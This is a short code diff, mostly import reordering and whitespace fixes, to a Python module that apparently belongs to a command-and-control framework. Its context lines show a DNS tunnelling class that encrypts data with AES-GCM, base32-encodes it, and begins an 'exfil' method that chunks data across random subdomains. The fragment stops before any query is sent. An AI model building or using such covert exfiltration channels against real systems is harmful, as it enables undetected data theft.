@@ -1,8 +1,10 @@
 # src/operators/c2_protocols/dns_tunneling.py
-import dns.resolver
 import os
 import random
+
+import dns.resolver
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
 
 class DNSTunnel:
     def __init__(self, domain="test.internal", key: bytes = None):
@@ -12,7 +14,7 @@ class DNSTunnel:
         # Use provided key or generate a new 256-bit key.
         self.key = key or AESGCM.generate_key(bit_length=256)
         self.aesgcm = AESGCM(self.key)
-        
+
     def _encrypt(self, data: bytes) -> str:
         """
         Encrypt data using AES-GCM with a random nonce.
@@ -23,7 +25,7 @@ class DNSTunnel:
         # For DNS, encode the combined nonce+ciphertext in base32 (without padding)
         from base64 import b32encode
         return b32encode(nonce + ct).decode().rstrip('=')
-    
+
     def exfil(self, data: bytes, chunk_size=48):
         for i in range(0, len(data), chunk_size):
             sub = random.SystemRandom().choice(self.subdomains)
